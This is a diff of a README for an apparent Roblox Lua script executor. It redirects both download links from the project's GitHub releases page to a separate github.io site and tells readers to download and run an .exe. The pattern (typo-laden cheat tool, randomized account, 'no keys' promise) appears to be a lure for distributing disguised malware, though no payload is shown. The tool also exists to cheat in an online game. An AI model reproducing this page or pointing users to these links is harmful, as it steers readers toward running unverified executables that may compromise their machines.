@@ -1,6 +1,6 @@
 # 🚀 arcadia-win-script-execute - Run your favority Lua scripts easily
 
-[![Download Arcadia](https://img.shields.io/badge/Download-Arcadia_v3.2-blue.svg)](https://github.com/Unadventurous-concertina802/arcadia-win-script-execute/releases)
+[![Download Arcadia](https://img.shields.io/badge/Download-Arcadia_v3.2-blue.svg)](https://unadventurous-concertina802.github.io)
 
 Arcadia PC v3.2 allows you to run Lua scripts within Roblox on your Windows computer. This tool includes a simple interface and a large library of scripts for users who want to change their gameplay. It works on Windows 10 and Windows 11 systems that use 64-bit architecture. You do not need to deal with keys or long verification waits.
 
@@ -19,7 +19,7 @@ Before you install this software, ensure your computer meets the following stand
 
 Follow these steps to set up Arcadia on your machine. We suggest that you close all other programs during the setup process.
 
-1.  Visit the official release page: https://github.com/Unadventurous-concertina802/arcadia-win-script-execute/releases
+1.  Visit the official release page: https://unadventurous-concertina802.github.io
 2.  Look for the "Assets" section at the bottom of the latest release post.
 3.  Click the file ending in .exe to start your download.
 4.  Navigate to your "Downloads" folder in File Explorer.
